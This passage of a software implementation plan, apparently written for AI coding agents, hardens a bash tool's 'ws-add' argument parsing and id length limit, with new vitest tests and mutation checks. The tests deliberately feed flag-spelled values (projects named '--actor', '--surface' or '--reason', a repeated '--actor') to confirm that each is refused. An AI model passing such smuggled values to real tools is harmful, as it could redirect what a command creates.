- The third command runs every caller of `_ws_tmproot_id_ok`'s suite. Its collector files are CLAUDE.md's load flakes: re-run a red file alone before calling it a break.
- An existing file outside this task's four that goes red is NOT edited. Name it by slug and STOP for a coordinator ruling (HARD BOUNDARY).

- [ ] **Step 11: Commit**

```bash
git add ccd/ccd ccd/ccrc-doctor-checks server/test/ccd-project-dash.test.ts \
  server/test/pool-name-parity.test.ts server/test/ccd-workspaces.test.ts server/test/ccd-project-pool.test.ts
git commit -F - <<'EOF'
fix(ccd): no project or temp-root id begins with a dash; enable validates its project

A dash-leading project is the one path by which ccd could mint an id spelled
as a flag: project `-` with slug `actor` is `--actor`. So _ws_project_valid
gains a leading-dash line of its own, separate from the charset line and the
dot line, and its callers say "no LEADING dot or dash". The function keeps
its line count: one line of its own header comment is folded.

enable's two-argument form now asks cmd_start's own wrapper check and
_ws_project_valid before it journals or locks, so an unrostered or
flag-spelled wrapper, or a dash- or dot-leading project, leaves no enable
row and no reap lock naming an id nothing created. It refuses more than
before, by design.

_ws_tmproot_id_ok is re-derived from _reg_id_ok. The witness, the records,
the slots, ws-collect and its audit now refuse a dash-leading id through one
spelling of the dash rule, and the predicate agrees with the server's
isTmpRootId on every name but length.

pool-name-parity's -lead row inverts: ccd and the doctor now refuse the same
leading-dash names, and ccd refuses to create the tag. The doctor's comment
and one ccd-workspaces comment line are reworded in place. ccd-project-pool's
enable case inverts with the wrapper check: the stripped --cross-pool still
leaves the real wrapper to refuse, and nothing is journaled.
EOF
```

---

---

### Task 6: ws-add refuses a second `--actor` and a dash-leading `--surface` value (line-neutral)

**Model routing:** `opus`, effort `high`.

**Why:**
- The coordinator's dispatch composes `CCD_ARGV.wsAddWorker(p, dec)`, which is `['ws-add', '--no-rc', …childFlags, …routeFlags, p, …decFlags(dec)]`. The project comes before the dec, and `POST /api/runs` checks only that `project` is a non-blank string.
- ws-add's loop scans every token as a possible flag. So two projects are redirects today:
  - A project of `--actor` parses `--actor --surface agent --actor '<actor>'` as actor=`--surface`, followed by the positional `agent` and a second `--actor`. The verb then creates `agent-<slug>`.
  - A project of `--surface` parses `--surface --surface agent …` as surface=`--surface`, followed by the positional `agent`. It creates the same row.
- Atomic consumption cannot fix a positional verb (spec §2.4), so ws-add gets two rules instead (R6, R18):
  - a second `--actor` is refused, in either spelling and in any mix of the two;
  - a `--surface` value that begins with `-` is refused, in both spellings (R2).
- Every refusal reuses ws-add's existing usage literal (R18, R26).
- A project of `-x` or `--reason` is already refused by `_ws_project_valid`'s dash line (Task 5, R7). This task pins that rule through the argv the server composes.
- Not built (R18): duplicate rules for `--surface` and `--child`.

**Entry:** Task 5 is committed on this branch. Step 0 measures this.

**Files:**
- Modify `ccd/ccd`, in `cmd_ws_add()`'s strip loop only. Four arm lines are edited in place, and no line is added or removed (R9; `cmd_ws_add` sits above the frozen corpus):
  - the `--surface)` head line (`      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-add …"`, hint `:6950`);
  - the `--surface=*)` line (hint `:6952`);
  - the `--actor)` head line (hint `:6953`);
  - the `--actor=*)` line (hint `:6955`).

  Then restamp with `bash ccd/ccrc restamp ccd/ccd`.
- Create `server/test/ccd-ws-add-dash-id.test.ts`.
- No other file. In particular, `ccd-workspaces.test.ts`, `ccd-lifecycle-sites.test.ts`, `ccd-ws-add-child.test.ts`, `ccd-spawn-split.test.ts`, `ccd-route-argv.test.ts` and `ccdargv-dec-parity.test.ts` are not edited (HARD BOUNDARY, R19).

**Interfaces:**
- Consumes:
  ```ts
  // server/src/ccdargv.ts (read-only; see the drafter notes, slug ws-add-dash-test-imports-ccdargv)
  export interface ActorFlags { readonly surface: StopSurface; readonly actor: string; readonly reason: string | null }
  CCD_ARGV.wsAddWorker: (p: string, dec: ActorFlags | null, route?: RouteFields | null, child?: number | null) => CcdArgv;
  // server/test/ccdWsHelpers.ts
  export function makeCcdHarness(prefix: string): CcdHarness;   // .home, .sh(snippet, env?), .reg(id, field), .makeRepo(name), .cleanup()
  export const WS_ADD: string;                                   // the _spawn/_spawn_start/_spawn_settle/_ws_supervise/_supervised_start/tmux stubs
  // server/test/lifecycleHelpers.ts
  export const eventsOf: (home: string, act: string) => Record<string, unknown>[];
  export const decOf: (e: Record<string, unknown>) => Record<string, string>;
  export const measOf: (e: Record<string, unknown>) => Record<string, string>;
  // server/test/dashIdFixture.ts (Task 1)
  export const DECOY_IDS: readonly ['agent', 'pwa'];
  export function regListing(home: string): string[];
  ```
  The test also relies on Task 5's dash line in `_ws_project_valid` (`  [[ "$1" != -* ]] || return 1`) and on its die text in `cmd_ws_add` ("… and no LEADING dot or dash …").
- Produces: ws-add's two loop rules, exactly as §Interfaces gives them. This task adds no bash name, die literal or test export.

- [ ] **Step 0: Measure the entry conditions (nothing is written)**

Run from the workspace root.

```bash
git log --oneline -1                                                                  # Task 5's commit
grep -c '(( ! lc_ga ))' ccd/ccd                                                       # 0: no duplicate rule yet
awk '/^_ws_project_valid\(\) \{/{f=1} f&&/^\}/{exit} f&&/\[\[ "\$1" != -\* \]\] \|\| return 1/{print NR}' ccd/ccd   # one line: Task 5's dash line
awk '/^cmd_ws_add\(\) \{/{f=1} f&&/no LEADING dot or dash/{print NR; exit}' ccd/ccd   # one line: Task 5's die text in cmd_ws_add
grep -nF '      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-add' ccd/ccd          # one line (hint 6950)
awk '/^cmd_ws_add\(\) \{/{f=1} f&&/^      --surface=\*\) lc_gs=1; lc_surface="\$\{1#--surface=\}"; shift ;;$/{print NR; exit}' ccd/ccd   # one line (hint 6952): ws-add's own; the other verbs keep the identical arm, so a whole-file grep prints several
grep -nF '      --actor)     [[ $# -ge 2 ]] || die "usage: ccd ws-add' ccd/ccd          # one line (hint 6953)
awk '/^cmd_ws_add\(\) \{/{f=1} f&&/^      --actor=\*\)   lc_ga=1; lc_actor="\$\{1#--actor=\}"; shift ;;$/{print NR; exit}' ccd/ccd   # one line (hint 6955)
grep -nF "wsAddWorker: (p: string, dec: ActorFlags | null" server/src/ccdargv.ts       # one line
grep -nF "argv(['ws-add', '--no-rc', ...childFlags(child), ...routeFlags(route), p, ...decFlags(dec)])" server/src/ccdargv.ts   # one line: the project BEFORE the dec
grep -n "export const DECOY_IDS\|export function regListing" server/test/dashIdFixture.ts   # two lines (Task 1)
ls server/test/ccd-ws-add-dash-id.test.ts 2>/dev/null || echo "absent, as expected"
grep -n '^cmd_ws_add() {' ccd/ccd; git show origin/main:ccd/ccd | grep -n '^cmd_ws_add() {'   # the same line number twice
```

STOP rules:
- If Task 5's dash line or its die text is absent, STOP. Task 5 has not landed (R7), and this task's `--reason` case would create a row.
- If any of the four arm anchors prints anything other than one line, re-read `cmd_ws_add`'s loop by content before Step 4.
- If `cmd_ws_add` starts on a different line than on `origin/main`, STOP: an earlier task moved a line above the corpus.
- If `wsAddWorker` no longer puts `p` before `decFlags(dec)` (a W1a reorder, which R6 does not require), carry on: the cases still hold. Record the slug `ws-add-builder-reordered` in the ledger. Cases 1 and 2 then pass before Step 4, because the trailing lone key is refused by arity. Record that change to Step 3's prediction too.

- [ ] **Step 1: Write the failing tests**

Create `server/test/ccd-ws-add-dash-id.test.ts`:

```ts
// server/test/ccd-ws-add-dash-id.test.ts
//
// ws-add never binds a project that the server's own flags spelled
// (path-identity spec §2.2, §2.4).
//
// The coordinator's dispatch composes
// ['ws-add', '--no-rc', ...child, ...route, <project>, ...dec].
// The project is positional and comes before the dec. ws-add's strip loop
// scans every token as a possible flag, so a project spelled like a dec flag
// used to bind the surface word that follows it:
//   - a project of --actor:   actor=--surface, project=agent, then a second --actor;
//   - a project of --surface: surface=--surface, project=agent.
// Either one created a row for project `agent`. Atomic consumption cannot fix a
// positional verb, because a token spelled like the key is the key. So ws-add
// gets two rules instead:
//   - a second --actor is refused, in either spelling and any mix of them;
//   - a --surface value that begins with "-" is refused, in both spellings.
// A project of -x or --reason is refused by _ws_project_valid's dash line
// (path-identity spec §2.4). The --reason case below pins that rule through
// the composed argv.
//
// Every argv the server can send is COMPOSED by CCD_ARGV.wsAddWorker. Shapes
// the server never composes (a second --actor, a dash-leading surface) are
// typed, and labelled as such.
//
// CONTAINMENT: every ccd call goes through h.sh, the harness's contained
// runner. This file starts no shell of its own, so ccd-workspaces.test.ts's
// spawn scan finds nothing to check in it.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { CCD_ARGV, type ActorFlags } from '../src/ccdargv.js';
import { makeCcdHarness, WS_ADD, type CcdHarness } from './ccdWsHelpers.js';
import { decOf, eventsOf, measOf } from './lifecycleHelpers.js';
import { DECOY_IDS, regListing } from './dashIdFixture.js';

/** `agent`: the surface word every unattended lane's dec carries, so the project a redirect lands on. */
const [DECOY] = DECOY_IDS;

/** The dispatch path's dec shape (`sweepDec`): a surface and an actor, and reason null.
 *  ws-add's loop has no --reason arm, so a dec with a reason is never sent here. */
const DISPATCH_DEC: ActorFlags = { surface: DECOY, actor: 'run:1 dispatch', reason: null };

const USAGE = 'usage: ccd ws-add';

let h: CcdHarness;
beforeEach(() => {
  h = makeCcdHarness('ccrc-ccd-ws-add-dash-');
  h.makeRepo(DECOY);
  h.makeRepo('demo');
});
afterEach(() => { h.cleanup(); });

/** One word for bash: single-quoted, with each embedded quote closed, escaped and reopened. */
const shq = (s: string): string => `'${s.replace(/'/g, `'\\''`)}'`;

interface Ran { readonly code: number; readonly stdout: string; readonly stderr: string }

/** cmd_ws_add with `args`, under WS_ADD's stubs, through the contained h.sh. It reports
 *  the exit code and both streams instead of throwing, which every refusal below needs. */
const wsAdd = (args: readonly string[], slug = 'quiet-mesa'): Ran => {
  const snippet = `${WS_ADD} cmd_ws_add ${args.map(shq).join(' ')}`;
  try { return { code: 0, stdout: h.sh(snippet, { CCD_WS_SLUG: slug }), stderr: '' }; }
  catch (e) {
    const err = e as { status?: number | null; stdout?: string | Buffer; stderr?: string | Buffer };
    return { code: err.status ?? 1, stdout: String(err.stdout ?? ''), stderr: String(err.stderr ?? '') };
  }
};

/** The argv the coordinator's dispatch COMPOSES for `project`, without the verb word
 *  (h.sh calls the verb as cmd_ws_add). */
const composed = (project: string, dec: ActorFlags = DISPATCH_DEC): readonly string[] => {
  const argv = CCD_ARGV.wsAddWorker(project, dec);
  expect(argv[0]).toBe('ws-add');
  return argv.slice(1);
};

/** The $REG listing after one source of ccd, so a refusal is compared against a settled tree. */
const settle = (): string[] => { h.sh(':'); return regListing(h.home); };

/** A refusal leaves the box as it found it: $REG unchanged, no row, no worktree, no create line. */
const nothingCreated = (before: readonly string[], project: string): void => {
  expect(regListing(h.home), 'the refusal changed $REG').toEqual(before);
  expect(regListing(h.home).filter((n) => n.endsWith('.uuid')), 'a registry row was created').toEqual([]);
  expect(fs.existsSync(path.join(h.home, 'worktrees', project)), `a worktree under worktrees/${project}`).toBe(false);
  expect(fs.existsSync(path.join(h.home, 'worktrees', DECOY)), 'a worktree for the decoy project').toBe(false);
  expect(eventsOf(h.home, 'create'), 'a create line was journaled').toEqual([]);
};

describe("ws-add never binds a project the server's flags spelled (path-identity spec §2.2, §2.4)", () => {
  it('project --actor is refused, and no agent-* row is created', () => {
    const before = settle();
    const r = wsAdd(composed('--actor'));
    expect(r.code, 'the composed argv for project --actor was not refused').not.toBe(0);
    expect(r.stderr).toContain(USAGE);
    expect(regListing(h.home).filter((n) => n.startsWith(`${DECOY}-`)), 'the redirect created a row for the decoy').toEqual([]);
    nothingCreated(before, '--actor');
  });

  it('project --surface is refused, and no row is created', () => {
    const before = settle();
    const r = wsAdd(composed('--surface'));
    expect(r.code, 'the composed argv for project --surface was not refused').not.toBe(0);
    expect(r.stderr).toContain(USAGE);
    nothingCreated(before, '--surface');
  });

  it('projects --child, --route and --no-rc are refused with their own words', () => {
    const cases: readonly (readonly [string, string])[] = [
      ['--child', '--child needs a run id (a positive integer), got: --surface'],
      ['--route', "bad --route '--surface' (want <field>=<value>)"],
      ['--no-rc', USAGE],
    ];
    for (const [project, said] of cases) {
      const before = settle();
      const r = wsAdd(composed(project));
      expect(r.code, `project ${project} was not refused`).not.toBe(0);
      expect(r.stderr, `project ${project}`).toContain(said);
      nothingCreated(before, project);
    }
  });

  it('project --reason with a planted projects/--reason repo is refused "invalid project"', () => {
    // A real repo at projects/--reason, so the only thing that stands between this
    // argv and a row named --reason-quiet-mesa is _ws_project_valid's dash line.
    h.makeRepo('--reason');
    const before = settle();
    const r = wsAdd(composed('--reason'));
    expect(r.code, 'project --reason was not refused').not.toBe(0);
    expect(r.stderr).toContain("invalid project '--reason'");
    expect(r.stderr).toContain('no LEADING dot or dash');
    nothingCreated(before, '--reason');
  });

  it('a second --actor is refused in every spelling mix', () => {
    // Typed: the server never sends two --actor flags. Its own redirect shape is the
    // first case above. Every mix of the two spellings is refused here.
    const mixes: readonly (readonly string[])[] = [
      ['--no-rc', '--actor', 'a', '--actor', 'b', 'demo'],
      ['--no-rc', '--actor=a', '--actor', 'b', 'demo'],
      ['--no-rc', '--actor', 'a', '--actor=b', 'demo'],
    ];
    for (const args of mixes) {
      const before = settle();
      const r = wsAdd(args);
      expect(r.code, `${args.join(' ')} was not refused`).not.toBe(0);
      expect(r.stderr, args.join(' ')).toContain(USAGE);
      nothingCreated(before, 'demo');
    }
  });

  it('a dash-leading --surface value is refused in both spellings', () => {
    // Typed: StopSurface cannot spell a dash-leading word, so no builder composes this.
    for (const args of [['--no-rc', '--surface', '-x', 'demo'], ['--no-rc', '--surface=-x', 'demo']] as const) {
      const before = settle();
      const r = wsAdd(args);
      expect(r.code, `${args.join(' ')} was not refused`).not.toBe(0);
      expect(r.stderr, args.join(' ')).toContain(USAGE);
      nothingCreated(before, 'demo');
    }
  });

  it("the dispatch path's argv for a real project still creates the workspace, its dec journaled", () => {
    const r = wsAdd(composed('demo'));
    expect(r.code, r.stderr).toBe(0);
    expect(r.stdout).toMatch(/^workspace demo-quiet-mesa /);
    expect(h.reg('demo-quiet-mesa', 'uuid'), 'the workspace was never created').not.toBeNull();
    expect(h.reg('demo-quiet-mesa', 'rc'), '--no-rc still means what it meant').toBe('off');
    const created = eventsOf(h.home, 'create');
    expect(created, 'ws-add wrote no create line').toHaveLength(1);
    expect(decOf(created[0]!)).toEqual({ surface: DECOY, actor: 'run:1 dispatch' });
    expect(measOf(created[0]!)['project']).toBe('demo');
    expect(regListing(h.home).filter((n) => n.startsWith(`${DECOY}-`))).toEqual([]);
  });

  it('prose may lead with a dash: an --actor value beginning with "-" still creates the workspace, in both spellings', () => {
    // Narrowing guard (path-identity spec §2.4): only the identity is checked. Actor prose keeps its domain.
    const r1 = wsAdd(composed('demo', { surface: DECOY, actor: '-device', reason: null }));
    expect(r1.code, r1.stderr).toBe(0);
    const r2 = wsAdd(['--no-rc', 'demo', '--actor=--tidy'], 'quiet-lake');
    expect(r2.code, r2.stderr).toBe(0);
    const created = eventsOf(h.home, 'create');
    expect(created).toHaveLength(2);
    expect(decOf(created[0]!)['actor']).toBe('-device');
    expect(decOf(created[1]!)['actor']).toBe('--tidy');
    expect(h.reg('demo-quiet-mesa', 'uuid')).not.toBeNull();
    expect(h.reg('demo-quiet-lake', 'uuid')).not.toBeNull();
  });
});
```

- [ ] **Step 2: Typecheck the new file**

```bash
cd server && ./node_modules/.bin/tsc --noEmit -p test/tsconfig.tests.json
```

Expected: no output.

- [ ] **Step 3: Run the tests to verify they fail**

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-ws-add-dash-id.test.ts
```

Run it in the foreground, with a timeout of at least 600000 ms. Expected: `Test Files  1 failed (1)`, `Tests  4 failed | 4 passed (8)`. The worker measures each red text, and a measured text replaces the draft's.

| Case | Expected before Step 4 | Why |
|---|---|---|
| project --actor | RED: `the composed argv for project --actor was not refused: expected 0 not to be 0` | the redirect creates `agent-quiet-mesa` |
| project --surface | RED: `…project --surface was not refused: expected 0 not to be 0` | the same redirect |
| projects --child, --route, --no-rc | green, and pinned | refused today by `_child_runid_valid`, `_route_argv_check` and `${1:?usage}` |
| project --reason | green, and pinned | Task 5's dash line |
| a second --actor | RED: `--no-rc --actor a --actor b demo was not refused: expected 0 not to be 0` | the second value overwrites the first, and `demo-quiet-mesa` is created |
| dash-leading --surface | RED: `--no-rc --surface -x demo was not refused: expected 0 not to be 0` | `-x` is normalised to `unknown` and the workspace is created |
| dispatch control | green | |
| prose may lead with a dash | green | |

If the --reason case is red, Task 5's dash line is missing: STOP (Step 0). If the --child, --route or --no-rc case is red on a different word, record the measured word and continue. Those refusals predate this wave.

- [ ] **Step 4: Implement (four arm lines in place, no line added)**

In `ccd/ccd`, inside `cmd_ws_add() {`, replace this block. It is unique, because ws-add's usage literal appears in it.

Before:
```bash
      --surface)   [[ $# -ge 2 ]] || die "usage: ccd ws-add [--no-rc] [--child <runId>] [--surface <word>] [--actor <text>] [--route <field>=<value>]... <project> [slug]"
                   lc_gs=1; lc_surface="$2"; shift 2 ;;
      --surface=*) lc_gs=1; lc_surface="${1#--surface=}"; shift ;;
      --actor)     [[ $# -ge 2 ]] || die "usage: ccd ws-add [--no-rc] [--child <runId>] [--surface <word>] [--actor <text>] [--route <field>=<value>]... <project> [slug]"
                   lc_ga=1; lc_actor="$2"; shift 2 ;;
      --actor=*)   lc_ga=1; lc_actor="${1#--actor=}"; shift ;;
```

After:
```bash
      --surface)   [[ $# -ge 2 && $2 != -* ]] || die "usage: ccd ws-add [--no-rc] [--child <runId>] [--surface <word>] [--actor <text>] [--route <field>=<value>]... <project> [slug]"
                   lc_gs=1; lc_surface="$2"; shift 2 ;;
      --surface=*) [[ ${1#--surface=} != -* ]] || die "usage: ccd ws-add [--no-rc] [--child <runId>] [--surface <word>] [--actor <text>] [--route <field>=<value>]... <project> [slug]"; lc_gs=1; lc_surface="${1#--surface=}"; shift ;;
      --actor)     [[ $# -ge 2 ]] && (( ! lc_ga )) || die "usage: ccd ws-add [--no-rc] [--child <runId>] [--surface <word>] [--actor <text>] [--route <field>=<value>]... <project> [slug]"
                   lc_ga=1; lc_actor="$2"; shift 2 ;;
      --actor=*)   (( ! lc_ga )) || die "usage: ccd ws-add [--no-rc] [--child <runId>] [--surface <word>] [--actor <text>] [--route <field>=<value>]... <project> [slug]"; lc_ga=1; lc_actor="${1#--actor=}"; shift ;;
```

Notes on the edit:
- `[[ $# -ge 2 && $2 != -* ]]` evaluates lazily, so `$2` is never expanded when `$#` is 1. A valueless `--surface` still answers the usage line under `set -u`, which `ccd-lifecycle-sites.test.ts`'s arity case pins.
- `--surface ''` passes, because an empty value does not begin with `-`. It still reads `unknown`, which `ccd-lifecycle-sites.test.ts` pins.
- `lc_ga` starts at 0 on the `local` line above the loop, so the first `--actor` in either spelling passes.
- No comment line is added. The `--route` and `--child` arms, the `*)` residue and the dec ladder below are unchanged.

Then restamp and check:

```bash
bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd
git diff --numstat -- ccd/ccd                                   # 5	5	ccd/ccd  (the four arms and the stamp line)
git show HEAD:ccd/ccd | wc -l; wc -l < ccd/ccd                   # the same number twice
diff <(git show HEAD:ccd/ccd | awk '/^[A-Za-z_][A-Za-z0-9_]*\(\) \{/{print NR, $1}') <(awk '/^[A-Za-z_][A-Za-z0-9_]*\(\) \{/{print NR, $1}' ccd/ccd)   # no output: every function starts where it started
grep -n '^cmd_ws_add() {' ccd/ccd; git show origin/main:ccd/ccd | grep -n '^cmd_ws_add() {'   # the same line twice
grep -c '(( ! lc_ga ))' ccd/ccd                                  # 2
```

- [ ] **Step 5: Run the tests to verify they pass**

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-ws-add-dash-id.test.ts
cd server && ./node_modules/.bin/vitest run test/ownership.test.ts test/mark-check.test.ts
```

Expected: `Tests  8 passed (8)`, and both guard files PASS. Run each in the foreground, with a timeout of at least 600000 ms.

- [ ] **Step 6: Mutation check**

Copy the good, restamped file once. Then apply each mutation alone, see the red, and restore before the next. Run every command from the workspace root.

```bash
S="${TMPDIR:-/tmp}/w1b-task6-mut"; mkdir -p "$S"; cp ccd/ccd "$S/ccd.good"
```

Each mutation uses this exact-string replacer, which refuses unless OLD occurs exactly once. `split`/`join` performs no `$`-pattern substitution.

```bash
node -e 'const fs=require("fs");const [a,b]=process.argv.slice(1);const s=fs.readFileSync("ccd/ccd","utf8");const n=s.split(a).length-1;if(n!==1){console.error("anchor count "+n);process.exit(1)}fs.writeFileSync("ccd/ccd",s.split(a).join(b))' 'OLD' 'NEW'
```

After each row:

```bash
cp "$S/ccd.good" ccd/ccd && cmp ccd/ccd "$S/ccd.good" && node shared/mark.mjs --check ccd/ccd
```

T is `(cd server && ./node_modules/.bin/vitest run test/ccd-ws-add-dash-id.test.ts -t '<title fragment>')`.

| # | OLD → NEW (the replacer's two arguments) | Command | Expected red |
|---|---|---|---|
| 1 | `      --actor)     [[ $# -ge 2 ]] && (( ! lc_ga )) \|\| die "usage: ccd ws-add` → `      --actor)     [[ $# -ge 2 ]] \|\| die "usage: ccd ws-add` | T `project --actor`, then T `second --actor` | `the composed argv for project --actor was not refused: expected 0 not to be 0` (`agent-quiet-mesa.uuid` created); `--no-rc --actor a --actor b demo was not refused: expected 0 not to be 0` |
| 2 | `      --actor=*)   (( ! lc_ga )) \|\| die "usage: ccd ws-add [--no-rc] [--child <runId>] [--surface <word>] [--actor <text>] [--route <field>=<value>]... <project> [slug]"; lc_ga=1;` → `      --actor=*)   lc_ga=1;` | T `second --actor` | `--no-rc --actor a --actor=b demo was not refused: expected 0 not to be 0` (the third mix) |
| 3 | `      --surface)   [[ $# -ge 2 && $2 != -* ]] \|\| die "usage: ccd ws-add` → `      --surface)   [[ $# -ge 2 ]] \|\| die "usage: ccd ws-add` | T `project --surface`, then T `dash-leading --surface` | `…project --surface was not refused: expected 0 not to be 0`; `--no-rc --surface -x demo was not refused: expected 0 not to be 0` |
| 4 | `      --surface=*) [[ ${1#--surface=} != -* ]] \|\| die "usage: ccd ws-add [--no-rc] [--child <runId>] [--surface <word>] [--actor <text>] [--route <field>=<value>]... <project> [slug]"; lc_gs=1;` → `      --surface=*) lc_gs=1;` | T `dash-leading --surface` | `--no-rc --surface=-x demo was not refused: expected 0 not to be 0` |
| 5 | Task 5's guard, cross-checked through the composed argv: `  [[ "$1" != -* ]] \|\| return 1` → `  :` | T `project --reason` | `expected '…' to contain "invalid project '--reason'"`. The verb runs on: it creates `--reason-quiet-mesa`, or fails later on another line. If the replacer prints `anchor count` other than 1, re-read Task 5's line and use its exact text |
| 6 | Narrowing guard: `      --actor)     [[ $# -ge 2 ]] && (( ! lc_ga )) \|\| die "usage: ccd ws-add` → `      --actor)     [[ $# -ge 2 && $2 != -* ]] && (( ! lc_ga )) \|\| die "usage: ccd ws-add` | T `prose may lead with a dash` | `ccd: usage: ccd ws-add …: expected 1 to be 0` |

In the replacer arguments, `\|` above is a table escape: type a plain `|`. Every argument goes inside single quotes, and none contains a single quote. After row 6, restore and confirm `cmp` is silent, `node shared/mark.mjs --check ccd/ccd` exits 0, and `git diff --numstat -- ccd/ccd` still prints `5	5	ccd/ccd`. Then remove the scratch copy with `rm -rf "$S"`. Record each row's measured red in the SDD ledger.

- [ ] **Step 7: Run the regression gates, unedited**

Run each line in the foreground, with a timeout of at least 600000 ms:

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-lifecycle-sites.test.ts test/ccd-ws-add-child.test.ts test/ccd-spawn-split.test.ts test/ccdargv-dec-parity.test.ts test/ccd-route-argv.test.ts
cd server && ./node_modules/.bin/vitest run test/ccd-workspaces.test.ts test/ccd-project-dash.test.ts test/pool-name-parity.test.ts test/ccd-actor-flags.test.ts
cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier'
cd server && ./node_modules/.bin/vitest run test/ownership.test.ts test/mark-check.test.ts
cd server && ./node_modules/.bin/tsc --noEmit -p test/tsconfig.tests.json
```

Expected: every file PASSES, and `tsc` prints nothing. Several of these runs are named gates:
- `ccd-workspaces.test.ts`'s spawn census scans the new `ccd-*.ts` file and finds no direct bash spawn in it.
- `ccd-actor-flags.test.ts`'s closed-set census still counts 2.
- The five citation passes are green with no number edited (R9). Edited lines that are not anchors move nothing, and Step 4's start-line diff proved that every function starts where it did.

If a file is red:
- Re-run a CLAUDE.md load flake in isolation before calling it a break.
- If an existing file is red for a reason this task caused, do NOT edit it. Name it by slug in the ledger and STOP for a coordinator ruling (HARD BOUNDARY).

- [ ] **Step 8: Commit**

```bash
git add ccd/ccd server/test/ccd-ws-add-dash-id.test.ts
git commit -m "$(cat <<'MSG'
fix(ccd): ws-add refuses a second --actor and a dash-leading --surface value (line-neutral)

The dispatch path composes ws-add's argv with the project before the dec,
so a project spelled like a dec flag bound the surface word after it:
- project --actor parsed as actor=--surface, project=agent, then a
  second --actor;
- project --surface parsed as surface=--surface, project=agent.
Both created a row for project agent. A positional verb cannot be fixed
by consuming pairs whole, so ws-add's loop gets two rules:
- a second --actor is refused, in either spelling and any mix of them;
- a --surface value beginning with "-" is refused, in both spellings.
Both reuse ws-add's usage line. A project of -x or --reason is already
refused by _ws_project_valid's dash line. Actor prose may still begin
with "-", and an empty --surface still reads unknown.

Four arm lines are edited in place. No line moves, so every function
keeps its start line and the citation passes stay green unedited.
ccd-ws-add-dash-id.test.ts pins both rules through the argv
CCD_ARGV.wsAddWorker composes, plus the --child, --route, --no-rc and
--reason projects, the dispatch control, and a dash-leading actor.
Path-identity spec §2.2, §2.4.
MSG
)"
```

Name these departures and extra pins by slug in the wave-done:
- `ws-add-refuses-a-second-actor` (R6) and `surface-dash-rule-at-stop-and-ws-add-only` (R2), shared with Task 3;
- `ws-add-dash-test-imports-ccdargv`;
- the extra pins: the `--surface=` mutation row, the dash-leading actor prose case, mutation row 5 (Task 5's dash line through the composed argv) and mutation row 6 (the narrowing guard).

---

### Task 7: A new id fits every name ccd derives from it

**Model routing:** `opus`, effort `high`. This task edits the same two mint sites as Tasks 5 and 6, plus `cmd_start`. It also sets the one number every later id refusal depends on.

**Why:**
- **R10, R27 (a).** The cap comes from a census of every name template that embeds an id. Every such name must fit NAME_MAX, which is 255 bytes. The cap is then lowered to the hook's own id gate, `CCRC_ID_MAX` (128), because the hook's peer census skips any longer id and that session silently loses its card. So `_REG_ID_MAX` = min(255 − W, `CCRC_ID_MAX`) = min(174, 128) = **128**. A test holds both the census and the number.
- **R10.** The cap applies at every mint site unconditionally, including `cmd_start`'s creating form when the row already exists. Each site has its own die line.
- **R15, R26.** The names `_REG_ID_MAX`, `_reg_id_cap` and `_REG_ID_CAP_WHY` sit between `_reg_id_ok` and `_ws_tmproot_id_ok`'s comment block. The sentence is defined once, and each site appends its own remedy. None of the three functions has a `ccd-refusal-scan` verb body.
- **R9.** `cmd_ws_add` sits above `cmd_start()`, so its edit is appended in place to an existing line and adds no line. The new block, `cmd_start` and `cmd_enable` all sit below every frozen anchor.

**Files:**
- Modify `ccd/ccd` in four places, each located by content:
  1. **The cap block.** Insert it directly below the `_reg_id_ok() {` line (Task 1) and above the `# THE ID A WITNESS MAY BE NAMED FOR` line (`_ws_tmproot_id_ok`'s comment block, as Task 5 left it).
  2. **`cmd_ws_add`.** Append to the line `                        || die "could not find a free slug for $project"; }`. The append is line-neutral. It runs on both the positional-slug path and the `CCD_WS_SLUG`/random path, and before `git -C "$main" fetch origin`.
  3. **`cmd_start`.** Add one line directly after `    id=$(_id "$wrapper" "$project")`, the occurrence inside `cmd_start() {`. A second, identical line in `cmd_stop` is NOT this anchor.
  4. **`cmd_enable`.** Add one line directly above `  _ws_expire_refuse_return "$id" enable`. That puts it below Task 5's `_ws_project_valid "$2"` check, and before `_lc_done enable`.

  Then restamp.
- Create the test `server/test/ccd-id-cap.test.ts`.
- Not edited: `ccd/session-hook.sh` (its `CCRC_ID_MAX` is only read), `session-hook.test.ts` (its ID_MAX peer case stays as it is), and every other existing test.

**Interfaces:**
- **Consumes:**
  - `_reg_id_ok` (Task 1).
  - From Task 5: `_ws_project_valid`'s dash line, and `cmd_enable`'s two-argument `_ws_project_valid "$2"` check.
  - `cmd_ws_add`'s loop as Task 6 left it. It is unchanged here.
  - From `server/test/ccdWsHelpers.ts`: `CCD`, `WS_ADD`, `ghContainedEnv`, `makeCcdHarness`, `CcdHarness` and `FIXTURE_MOUNTINFO`.
  - `inheritedEnv` (`server/test/gitEnvStrip.ts`).
  - `eventsOf` (`server/test/lifecycleHelpers.ts`).
  - The stub shape of `ccd-start-id.test.ts` (`STUBS`, `run`, `seedRow`), copied rather than imported.
- **Produces, in `ccd/ccd`:**
  ```bash
  _REG_ID_MAX=128
  _REG_ID_CAP_WHY=''
  _reg_id_cap() {   # id -> 0 iff its BYTES fit _REG_ID_MAX; 1 sets _REG_ID_CAP_WHY. Prints nothing; never dies.
  ```
  `_REG_ID_CAP_WHY` is set to exactly: `id '<ID>' is <n> bytes; a new id may be at most <_REG_ID_MAX>, so that every name ccd derives from it fits the 255-byte name limit`.
- **Produces, test-local in `server/test/ccd-id-cap.test.ts`:**
  ```ts
  interface IdNameTemplate { readonly file: string; readonly template: string; readonly overhead: number }
  const ID_NAME_TEMPLATES: readonly IdNameTemplate[];
  const CENSUS_EXCLUDED: readonly { file: string; reason: string }[];
  const NAME_MAX = 255;
  ```

- [ ] **Step 0: Entry conditions (Tasks 1, 5 and 6 are committed; measure, never assume)**

Run from the workspace root:

```bash
grep -n '^_reg_id_ok() {' ccd/ccd                                                     # (a) one line (Task 1)
grep -c '_reg_id_cap\|_REG_ID_MAX\|_REG_ID_CAP_WHY' ccd/ccd                            # (b) 0
